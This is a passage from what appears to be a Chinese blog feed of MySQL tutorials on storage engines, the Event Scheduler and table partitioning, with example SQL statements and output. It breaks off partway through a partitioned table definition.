      <content type="html"><![CDATA[<p>查看当前的默认存储引擎<br><code>show variables like &#39;table_type&#39;;</code></p>
<p>查看当前数据库支持的引擎<br><code>show engines \G;</code><br><code>show variables like &#39;have%&#39;;</code></p>
<p>创建表时指定存储引擎<br><code>create table ai (i bigint(20) not null auto_increment,primary key(i));</code></p>
<p>修改表引擎<br><code>alter table ai engine=innodb;</code></p>
<p><strong>常见Mysql数据库引擎对比：</strong></p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/engines.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/engines.png" alt="engines"></a></p>
<h4 id="MyISAM引擎特点"><a href="#MyISAM引擎特点" class="headerlink" title="MyISAM引擎特点"></a>MyISAM引擎特点</h4><p>在磁盘存储成3个文件，文件名和表名一样，但扩展名分别为：<br>.frm (存储表定义)<br>.MYD （MYData，存储数据）<br>.MYI （MYIndex，存储索引）<br>其中数据文件和索引文件可以分开在不同目录，平均分布IO</p>
<p>创建表时指定数据和索引路径：</p>
<p><code>create table geekwolf (id int,c varchar(10)) data directory=&#39;/data/data/&#39; index directory=&#39;/data/index&#39; engine=&#39;MyISAM&#39;;</code></p>
<p>MyISAM的表可能出现损坏的解决办法：<br>check table geekwolf；检查表的健康情况<br>repair table geekwolf；修改表</p>
<p>MyISAM的表引擎支持3种不同的存储格式：<br><strong>静态表</strong>（默认格式，固定长度，存储时按照列宽度定义补足空格；在查询时会丢失尾部的空格）<br><strong>动态表</strong>（频繁更新删除记录会产生碎片，占用空间相对较少，需要定期执行optimize table 或myisamchk -r来改善性能）<br><strong>压缩表</strong> （由myisampack工具创建）</p>
<p><strong>适用场景：</strong><br>以读操作和插入操作为主，只有很少的更新和删除操作，并且对事务的完整性，并发性要求不是很高的场景</p>
<h4 id="INNODB引擎特点"><a href="#INNODB引擎特点" class="headerlink" title="INNODB引擎特点"></a>INNODB引擎特点</h4><p><strong>1.自动增长列：</strong></p>
<p>InnoDB表，自动增长列必须是索引，如果是组合索引，必须是组合索引的第一列；&lt;br&gt;<br>对于MyISAM引擎表，自动增长列可以是组合索引的其他列，这样插入记录后，自动增长列是按照组合索引的前面激烈进行排序后递增的<br>创建MyISAM表autoincre_demo<br><code>create table autoincre_demo (d1 smallint not null auto_increment,d2 smallint not null,name varchar(10),index(d2.d1)) engine=myisam;</code></p>
<p>如图所示：自动增长列是d1作为组合索引的第二列,插入记录后，发现增长列是按照组合索引的第一列d2进行排序后递增的</p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/autoincre.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/autoincre.png" alt="autoincre"></a></p>
<p><strong>2.外键约束：</strong><br>Innodb引擎支持外键，在创建外键时，要求父表必须有对应的索引，子表在创建外键的时候也会自动创建对应的索引<br>    外键信息可以通过<br>    show table status like ‘test’ \G;<br>    show create table ‘test’;</p>
<p><strong>3.存储方式：</strong><br><strong>A.</strong> 使用共享表空间，这种方式创建的表结果保存在.frm文件，数据和索引保存在innodb_data_home_dir innodb_data_file_path定义的表空间中<br><strong>B.</strong>多表空间存储，表结构保存在.frm文件中，但是每个表的数据和索引单独存放在.ibd中；每个分区对于单独的.ibd<br>（需要开启innodb_file_per_table=1）<br>对于使用多表空间的表可以方便进行单表备份恢复，简单复制ibd和frm文件的方法因没有共享表空间的字典信息，而无法使用；多表空间情况，因为Innodb把内部的数据字典和在线重做日志存放在共享表空间里面</p>
<p><strong>使用此语句删除.ibd文件：</strong><br><code>ALTER TABLE tbl_name DISCARD TABLESPACE;</code><br>要把备份的.ibd文件还原到表中，需把此文件复制到数据库目录中，然后书写此语句：<br><code>ALTER TABLE tbl_name IMPORT TABLESPACE;</code></p>
<p><strong>适用场景：</strong><br>需要事务处理，对事务的完整性要求高，并发条件下要求数据一致性的计费系统或者财务系统等对数据准心要求比较搞的系统（5.5+默认引擎）</p>
<h4 id="MEMORY引擎"><a href="#MEMORY引擎" class="headerlink" title="MEMORY引擎"></a>MEMORY引擎</h4><p><strong>A.</strong>每个MEMORY表实际对应一个磁盘文件.frm，数据存放在内存，默认采用HASH索引（也可以设置撑Btree索引），服务关闭数据会丢失<br><strong>B.</strong>是否memory表中的内存可以通过delete from 或者truncate 或者drop table<br><strong>C.</strong>memory表可以放置数据量的大小受到max_heap_table_size变量约束，默认16M，在定义表时可以用MAX_ROWS指定表的最大行数<br><strong>D.</strong>使用环境：用于内容变化不频繁或者作为统计操作的中间结果表</p>
<p><strong>适用场景：</strong><br>一般用于更新不太频繁的小表，用以快速得到访问结果的环境，但对表大小有限制</p>
<h4 id="TOKUDB引擎"><a href="#TOKUDB引擎" class="headerlink" title="TOKUDB引擎"></a>TOKUDB引擎</h4><p>具有高压缩率高效的插入性能，支持大多数在线DDL<br>与InnoDB引擎对比测试：<a href="http://www.tokutek.com/resources/tokudb-vs-innodb/" target="_blank" rel="external">http://www.tokutek.com/resources/tokudb-vs-innodb/</a><br><strong>特性：</strong></p>
<p>使用Fractal树索引保证了高效的插入性能<br>优秀的压缩特性，比InnoDB高近10倍<br>Hot Schema Changes特性支持在线创建索引和添加/删除属性列等DDL操作<br>使用Bulk Loader达到快速加载大数据量<br>提供主从延迟消除技术<br>支持ACID和MVCC</p>
<p><strong>适用场景：</strong><br>日志数据，日志通常插入频繁切存储量大；<br>历史数据，通常不会再有写操作，可以利用TokuDB的高压缩特性存储；<br>在线DDL较频繁的场景，使用TokuDB可以大大增加系统可用性；</p>
<p><strong>注：</strong> 具体使用哪种引擎要根据自己的业务的特点去决定</p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Mysql事件调度器(Event Scheduler)]]></title>
      <url>/2014/08/19/mysql-event-scheduler.html</url>
      <content type="html"><![CDATA[<pre><code>Mysql中的事件调度器Event Scheduler类似于linux下的crontab计划任务的功能,它是由一个特殊的时间调度线程执行的
</code></pre><h4 id="一、查看当前是否开启了event-scheduler三种方法"><a href="#一、查看当前是否开启了event-scheduler三种方法" class="headerlink" title="一、查看当前是否开启了event scheduler三种方法"></a>一、查看当前是否开启了event scheduler三种方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1) SHOW VARIABLES LIKE ‘event_scheduler’;</div><div class="line">2) SELECT @@event_scheduler;</div><div class="line">3) SHOW PROCESSLIST;(是否有State为：Waiting for next activation的进程，User为event_scheduler)</div></pre></td></tr></table></figure>
<h4 id="二、启动关闭event-scheduler方法"><a href="#二、启动关闭event-scheduler方法" class="headerlink" title="二、启动关闭event scheduler方法"></a>二、启动关闭event scheduler方法</h4><p>时间调度器是否开启由全局变量event_scheduler决定，它有三个可以设定的值： – OFF : 事件调度器是关闭的，调度线程并没有运行，并且在SHOW PROCESSLIST中不显示，默认值是OFF – ON ：事件调度器是开启的，调度线程并没有运行，并且执行所有的调度事件，通过SHOW PROCESSLIST可以查看Waiting for next activation的进程 – DISABLED : 设定这个值表示Event Scheduler是被禁止的，无法在Mysql运行状态下改变其值</p>
<p><strong>注：</strong>在Mysql启动时如果在my.cnf设置了event_scheduler=ON（OFF or 1 or 0）时，就不能在运行时修改撑DISABLED，如果设置event_scheduler=DISABLED时，就不能在运行时修改其值为ON （ OFF or 1 or 0）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">mysql&gt; SELECT @@event_scheduler;</div><div class="line">+-------------------+</div><div class="line">| @@event_scheduler |</div><div class="line">+-------------------+</div><div class="line">| DISABLED |</div><div class="line">+-------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line">mysql&gt; SET @@global.event_scheduler = 1; </div><div class="line">ERROR 1290 (HY000): The MySQL server is running with the --event-scheduler=DISABLED or --skip-grant-tables option so it cannot execute this statement</div><div class="line"></div><div class="line">在mysql运行时开启Event（4种方法均可）：</div><div class="line">SET GLOBAL event_scheduler = ON;</div><div class="line">SET @@global.event_scheduler = ON;</div><div class="line">SET GLOBAL event_scheduler = 1;</div><div class="line">SET @@global.event_scheduler = 1;</div><div class="line"></div><div class="line">在mysql运行时关闭Event（4种方法均可）：</div><div class="line">SET GLOBAL event_scheduler = OFF;</div><div class="line">SET @@global.event_scheduler = OFF;</div><div class="line">SET GLOBAL event_scheduler = 0;</div><div class="line">SET @@global.event_scheduler = 0;</div></pre></td></tr></table></figure></p>
<h4 id="三、创建Event"><a href="#三、创建Event" class="headerlink" title="三、创建Event"></a>三、创建Event</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">语法：</div><div class="line">CREATE</div><div class="line">    [DEFINER = &#123; user | CURRENT_USER &#125;]</div><div class="line">    EVENT</div><div class="line">    [IF NOT EXISTS]</div><div class="line">    event_name</div><div class="line">    ON SCHEDULE schedule</div><div class="line">    [ON COMPLETION [NOT] PRESERVE]</div><div class="line">    [ENABLE | DISABLE | DISABLE ON SLAVE]</div><div class="line">    [COMMENT &apos;comment&apos;]</div><div class="line">    DO event_body;</div><div class="line"></div><div class="line">schedule:</div><div class="line">    AT timestamp [+ INTERVAL interval] ...</div><div class="line">  | EVERY interval</div><div class="line">    [STARTS timestamp [+ INTERVAL interval] ...]</div><div class="line">    [ENDS timestamp [+ INTERVAL interval] ...]</div><div class="line">interval:</div><div class="line">    quantity &#123;YEAR | QUARTER | MONTH | DAY | HOUR | MINUTE |</div><div class="line">             WEEK | SECOND | YEAR_MONTH | DAY_HOUR | DAY_MINUTE |</div><div class="line">             DAY_SECOND | HOUR_MINUTE | HOUR_SECOND | MINUTE_SECOND&#125;</div></pre></td></tr></table></figure>
<p><strong>说明：</strong></p>
<p>  DEFINER默认是CREATE EVENT的用户,可以理解为DEFINER=CURRENT_USER,指该event的用户，服务器在执行该事件时，使用该用户来检查权限；如果设置语法:‘user_name’@‘host_name’，如果当前CREATE EVENT用户没有supser权限，则无法将该event指派给其他用户；如果有super权限，则可以指定任意存在的用户，若不存在，时间执行时报错<br>IF NOT EXISTS ： 如果在同一个schema创建一个已经存在的event_name时不会做任何操作，也不会出错，但会出现warings：该event已经存在；如果不增加此关键词已经存在的话提示ERROR： 1537 (HY000): Event ‘countsum’ already exists<br>ON SCHEDULE ：用于设置什么时间执行，执行的频率及执行多久的问题<br>AT timestamp ：表示在给定的datetime或者timestamp的时间执行一次</p>
<ul>
<li>INTERVAL interval：表示从AT timestamp多久之后执行<br>EVERY interval ：有规律的重复执行<br>[ENABLE | DISABLE]可是设置该事件创建后状态是否开启或关闭，默认为ENABLE<br>[COMMENT ‘comment’]可以给该事件加上注释。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">event创建时间的3周2天后：</div><div class="line">AT  CURRENT_TIMESTAMP + INTERVAL 3 WEEK + INTERVAL 2 DAY</div><div class="line"></div><div class="line">2分钟10秒： </div><div class="line">+ INTERVAL &apos;2:10&apos; MINUTE_SECOND</div><div class="line"></div><div class="line">每6周：</div><div class="line">EVERY 6 WEEK</div><div class="line"></div><div class="line">从现在开始30分钟后每12小时执行一次到从现在到4周后结束执行：</div><div class="line">EVERY 12 HOUR STARTS CURRENT_TIMESTAMP + INTERVAL 30 MINUTE ENDS CURRENT_TIMESTAMP + INTERVAL 4 WEEK</div></pre></td></tr></table></figure>
</li>
</ul>
<p><strong>实例：</strong><br>前提：创建EVENT的用户需要只少对应schema的EVENT权限<br>最基本的create event只需要三个部分：<br>1. create event关键字以及一个event名称<br>2. on schedule子句<br>3. do子句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">1 在创建事件myevent1小时后执行，执行一条更新</div><div class="line"></div><div class="line">CREATE EVENT myevent</div><div class="line">    ON SCHEDULE AT CURRENT_TIMESTAMP + INTERVAL 1 HOUR</div><div class="line">DO</div><div class="line">  UPDATE myschema.mytable SET mycol = mycol + 1;</div><div class="line"></div><div class="line">2.2014年3月20日12点整清空test表：</div><div class="line"></div><div class="line">CREATE EVENT e_test</div><div class="line">    ON SCHEDULE AT TIMESTAMP &apos;2014-03-20 12:00:00&apos;</div><div class="line">    DO TRUNCATE TABLE test.aaa;</div><div class="line"></div><div class="line">3.5天后开启每天定时清空test表：</div><div class="line"></div><div class="line">CREATE EVENT e_test</div><div class="line">    ON SCHEDULE EVERY 1 DAY</div><div class="line">    STARTS CURRENT_TIMESTAMP + INTERVAL 5 DAY</div><div class="line">    DO TRUNCATE TABLE test.aaa;</div><div class="line"></div><div class="line">4.每天定时清空test表，5天后停止执行</div><div class="line"></div><div class="line">CREATE EVENT e_test</div><div class="line">    ON SCHEDULE EVERY 1 DAY</div><div class="line">    ENDS CURRENT_TIMESTAMP + INTERVAL 5 DAY</div><div class="line">    DO TRUNCATE TABLE test.aaa;</div><div class="line"></div><div class="line">5.5天后开启每天定时清空test表，一个月后停止执行：</div><div class="line"></div><div class="line">CREATE EVENT e_test</div><div class="line">    ON SCHEDULE EVERY 1 DAY</div><div class="line">    STARTS CURRENT_TIMESTAMP + INTERVAL 5 DAY</div><div class="line">    ENDS CURRENT_TIMESTAMP + INTERVAL 1 MONTH</div><div class="line">    DO TRUNCATE TABLE test.aaa;</div><div class="line"></div><div class="line">6.每天定时清空test表(只执行一次，任务完成后就终止该事件)：</div><div class="line"></div><div class="line">CREATE EVENT e_test</div><div class="line">    ON SCHEDULE EVERY 1 DAY</div><div class="line">    ON COMPLETION NOT PRESERVE</div><div class="line">    DO TRUNCATE TABLE test.aaa;</div><div class="line"></div><div class="line">[ON COMPLETION [NOT] PRESERVE]可以设置这个事件是执行一次还是持久执行，默认为NOT PRESERVE。</div></pre></td></tr></table></figure></p>
<h4 id="四、修改Event"><a href="#四、修改Event" class="headerlink" title="四、修改Event"></a>四、修改Event</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">ALTER</div><div class="line">   [DEFINER = &#123; user | CURRENT_USER &#125;]</div><div class="line">   EVENT event_name</div><div class="line">   [ON SCHEDULE schedule]</div><div class="line">   [ON COMPLETION [NOT] PRESERVE]</div><div class="line">   [RENAME TO new_event_name]</div><div class="line">   [ENABLE | DISABLE | DISABLE ON SLAVE]</div><div class="line">   [COMMENT &apos;comment&apos;]</div><div class="line">   [DO event_body]</div></pre></td></tr></table></figure>
<p><strong>说明：</strong><br>对于任何一个拥有定义在database里面事件的event权限的用户都可以修改event，并且成功需改后，那个用户就会成为此event的definer<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">实例：</div><div class="line">CREATE EVENT myevent</div><div class="line">    ON SCHEDULE</div><div class="line">      EVERY 6 HOUR</div><div class="line">    COMMENT &apos;A sample comment.&apos;</div><div class="line">    DO</div><div class="line">      UPDATE myschema.mytable SET mycol = mycol + 1;</div><div class="line"></div><div class="line">将上面的event从开始之后每6个小时执行一次改为从开始4个小时后每12小时执行一次</div><div class="line"></div><div class="line">只修改schedule</div><div class="line">ALTER EVENT myevent</div><div class="line">    ON SCHEDULE</div><div class="line">      EVERY 12 HOUR</div><div class="line">    STARTS CURRENT_TIMESTAMP + INTERVAL 4 HOUR;</div><div class="line">同时修改schedule和body</div><div class="line">ALTER EVENT myevent</div><div class="line">    ON SCHEDULE</div><div class="line">      AT CURRENT_TIMESTAMP + INTERVAL 1 DAY</div><div class="line">    DO</div><div class="line">      TRUNCATE TABLE myschema.mytable;</div></pre></td></tr></table></figure></p>
<p>关闭、启动、别名、移动、删除event：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">临时关闭某个event</div><div class="line">ALTER EVENT myevent DISABLE;</div><div class="line"></div><div class="line">开启某个event</div><div class="line">ALTER EVENT myevent ENABLE;</div><div class="line"></div><div class="line">别名某个event</div><div class="line">ALTER EVENT olddb.myevent</div><div class="line">RENAME TO newdb.myevent;</div><div class="line"></div><div class="line">将myevent从olddb库移动到newdb库</div><div class="line">ALTER EVENT olddb.myevent</div><div class="line">RENAME TO newdb.myevent;</div><div class="line"></div><div class="line">删除event</div><div class="line">DROP EVENT [IF EXISTS] event_name</div></pre></td></tr></table></figure></p>
<h4 id="五、查询Event信息"><a href="#五、查询Event信息" class="headerlink" title="五、查询Event信息"></a>五、查询Event信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">Event信息相关表：</div><div class="line">information_schema.events</div><div class="line">mysql.event</div><div class="line"></div><div class="line">查看事件的创建信息</div><div class="line">show create event countsum \G</div><div class="line"></div><div class="line">查看sem库的events信息</div><div class="line">USE sem；</div><div class="line">SHOW EVENTS \G</div><div class="line"></div><div class="line">SHOW EVENTS FROM sem;</div></pre></td></tr></table></figure>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><blockquote>
<p><a href="https://dev.mysql.com/doc/refman/5.5/en/events.html" target="_blank" rel="external">https://dev.mysql.com/doc/refman/5.5/en/events.html</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Mysql分区管理]]></title>
      <url>/2014/08/19/mysql-partitions.html</url>
      <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>很长时间没写博客了，这两天一直在学习Mysql分区，总结下:<br>Mysql支持水平分区，并不支持垂直分区;<br><strong>水平分区</strong>：指将同一表中不同行的记录分配到不同的物理文件中；<br><strong>垂直分区</strong>：指将同一表中不同列的记录分配到不同的物理文件中；<br>其中CSV、FEDORATED、MERGE等引擎不支持分区，MYISAM、InnoDB、NDB等引擎支持分区</p>
<h4 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h4><p>将一个表或索引分解为多个更小、更可管理的部分，从逻辑上讲，只有一个表或者索引，但是物理上这个表或者索引可能由数十个物理分区组成；没个分区都是独立的对象，可以独自处理，也可以作为一个更大对象的一部分进行处理（如果分区表很大，亦可以将分区分配到不同的磁盘上去）；在执行查询的时候，优化器会根据分区定义过滤哪些没有我们需要数据的分区，这样查询就无须全表扫描所有分区，只查找包含需要数据的分区即可</p>
<h4 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h4><p>1、表非常大以至于无法全部都放到内存，或者只在表的最后部分有热点数据，其他均为历史数据 2、分区表数据更容易维护（可独立对分区进行优化、检查、修复及批量删除大数据可以采用drop分区的形式等） 3、分区表的数据可以分布在不同的物理设备上，从而高效地利用多个硬件设备 4、分区表可以避免某些特殊的瓶颈（ps: InnoDB的单个索引的互斥访问、ext3文件系统的inode锁竞争等） 5、可以备份和恢复独立的分区，非常适用于大数据集的场景</p>
<h4 id="分区表限制"><a href="#分区表限制" class="headerlink" title="分区表限制"></a>分区表限制</h4><ol>
<li>单表最多支持1024个分区</li>
<li>MySQL5.1只能对数据表的整型列进行分区，或者数据列可以通过分区函数转化成整型列;MySQL5.5的RANGE LIST类型可以直接使用列进行分区</li>
<li>如果分区字段中有主键或唯一索引的列，那么所有的主键列和唯一索引列都必须包含进来</li>
<li>分区表无法使用外键约束</li>
<li>分区必须使用相同的Engine</li>
<li>对于MyISAM分区表，不能在使用LOAD INDEX INTO CACHE操作</li>
<li>对于MyISAM分区表，使用时会打开更多的文件描述符（单个分区是一个独立的文件）</li>
</ol>
<h4 id="分区策略"><a href="#分区策略" class="headerlink" title="分区策略"></a>分区策略</h4><ol>
<li>全量扫描数据，不需要任何索引：通过where条件大概定位哪个分区，必须将查询所需要扫描的分区个数限制在很小的数量</li>
<li>建立分区索引，分离热点：如将明显的热点数据分离到一个分区，使其尽量缓存到内存中，这样就能充分使用索引和缓存<br><strong>注意</strong>：以上策略均以查询得到过滤，丢掉额外的分区，分区本身不产生额外的代价为准则】</li>
</ol>
<h5 id="分区表使用过程的坑坑"><a href="#分区表使用过程的坑坑" class="headerlink" title="分区表使用过程的坑坑"></a>分区表使用过程的坑坑</h5><ol>
<li><p>NULL值会使分区过滤无效:<br>分表的表达式的值可以是NULL，第一个分区为特殊分区存放NULL或者非法值<br>如： PARTITION BY RANGE YEAR(order_date)进行分区，那么order_date为NULL或者非法值，记录存放在第一个分区:<br>WHERE order_date BETWEEN ‘2014-01-01’ AND ‘2014-01-31’查询时会检查两个分区：<br>第一个分区及1月份分区，避免第一分区数据过大时造成查询代价过高，可以使用：建立第一分区专门存放order_date为NULL和非法值记录 PARTITION p_nulls VALUES LESS THAN(0)<br>MySQL5.5以后可以才用一下语法解决问题： PARTITION BY RANGE COLUMNS(order_date)</p>
</li>
<li><p>分区列和索引列不匹配<br>此种情况下查询无法进行分区过滤，分区失效除非查询中包含了可以过滤分区的条件</p>
</li>
<li><p>RANGE类型分区随着分区数量增加会对MYSQL额外增加查询分区定义列表（符合条件行在哪个分区）的压力，尽量限制适当的分区数量;key和hash类型分区不存在此问题</p>
</li>
<li><p>重组分区或者类似alter语句可能会造成很大的开销<br>新建或者删除分区操作很快，重组分区或者类似ALTER语句操作会先创建一个临时的分区，将数据复制其中，然后在删除原分区</p>
</li>
</ol>
<h4 id="分区表类型"><a href="#分区表类型" class="headerlink" title="分区表类型"></a>分区表类型</h4><ol>
<li><p>RANGE分区：行数据基于属于一个给定连续区间的列值被放入分区<br>MySQL5.5开始支持RANGE COLUMNS的分区（引入Columns分区解决了MySQL 5.5版本之前RANGE分区和LIST分区只支持整数分区，从而导致需要额外的函数计算得到整数或者通过额外的转换表来转换为整数再分区的问题。Columns分区可以细分为RANGE Columns分区和LIST Columns分区，RANGE Columns分区和LIST Columns分区都支持整数、日期时间、字符串三大数据类型）</p>
</li>
<li><p>LIST分区：类似于按RANGE分区，区别在于LIST分区是基于列值匹配一个离散值集合中的某个值来进行选择。<br>MySQL5.5开始支持RANGE COLUMNS的分区</p>
</li>
<li><p>HASH分区：根据用户自定义的表达式的返回值来进行分区，返回值不能为负数 4. KEY分区：根据MySQLS数据库提供的哈希函数来进行分区 【注：无论创建何种类型的分区，如果表中存在主键或唯一索引时，分区列必须是唯一索引的一个组成部分】</p>
</li>
</ol>
<h4 id="分区表相关操作"><a href="#分区表相关操作" class="headerlink" title="分区表相关操作"></a>分区表相关操作</h4><h4 id="分区相关查询"><a href="#分区相关查询" class="headerlink" title="分区相关查询"></a>分区相关查询</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div></pre></td><td class="code"><pre><div class="line">查看当前数据库是否支持分区</div><div class="line">mysql&gt; show variables like &apos;%partition%&apos;;</div><div class="line">+---------------------------------------+-------+</div><div class="line">| Variable_name | Value |</div><div class="line">+---------------------------------------+-------+</div><div class="line">| have_partitioning | YES |</div><div class="line">| innodb_adaptive_hash_index_partitions | 1 |</div><div class="line">+---------------------------------------+-------+</div><div class="line">2 rows in set</div><div class="line"></div><div class="line">查看创建分区表的CREATE语句</div><div class="line"></div><div class="line">mysql&gt;show create table operation_log;</div><div class="line"></div><div class="line">查看表是否为分区表(Create_options)</div><div class="line">mysql&gt;show table status(当前库所有表状态)</div><div class="line">mysql&gt;show table status from lockrank like &apos;%operation_log%&apos;;(lockrank库operation_log表状态)</div><div class="line">*************************** 1\. row ***************************</div><div class="line">Table: operation_log</div><div class="line">Create Table: CREATE TABLE `operation_log` (</div><div class="line">  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,</div><div class="line">  `cid` mediumint(7) unsigned NOT NULL,</div><div class="line">  `accountid` mediumint(8) NOT NULL DEFAULT &apos;0&apos; ,</div><div class="line">  `flag` tinyint(1) unsigned NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  `addtime` int(11) unsigned NOT NULL,</div><div class="line">  `device` tinyint(1) unsigned NOT NULL DEFAULT &apos;1&apos; ,</div><div class="line">  PRIMARY KEY (`id`,`addtime`),</div><div class="line">  KEY `idx_accountid_addtime` (`accountid`,`addtime`),</div><div class="line">  KEY `idx_accountid_flag` (`accountid`,`flag`),</div><div class="line">) ENGINE=InnoDB AUTO_INCREMENT=50951039 DEFAULT CHARSET=utf8 COMMENT=&apos;操作记录&apos;</div><div class="line">/*!50100 PARTITION BY RANGE (addtime)</div><div class="line">(PARTITION `2013-05` VALUES LESS THAN (1370016000) ENGINE = InnoDB,</div><div class="line"> PARTITION `2013-06` VALUES LESS THAN (1372608000) ENGINE = InnoDB,</div><div class="line"> PARTITION `2013-07` VALUES LESS THAN (1375286400) ENGINE = InnoDB,</div><div class="line"> PARTITION `2013-08` VALUES LESS THAN (1377964800) ENGINE = InnoDB,</div><div class="line"> PARTITION `2013-09` VALUES LESS THAN (1380556800) ENGINE = InnoDB,</div><div class="line"> PARTITION `2013-10` VALUES LESS THAN (1383235200) ENGINE = InnoDB,</div><div class="line"> PARTITION `2013-11` VALUES LESS THAN (1385827200) ENGINE = InnoDB,</div><div class="line"> PARTITION `2013-12` VALUES LESS THAN (1388505600) ENGINE = InnoDB,</div><div class="line"> PARTITION `2014-01` VALUES LESS THAN (1391184000) ENGINE = InnoDB,</div><div class="line"> PARTITION `2014-02` VALUES LESS THAN (1393603200) ENGINE = InnoDB,</div><div class="line"> PARTITION `2014-03` VALUES LESS THAN (1396281600) ENGINE = InnoDB,</div><div class="line"> PARTITION `2014-04` VALUES LESS THAN (1398873600) ENGINE = InnoDB,</div><div 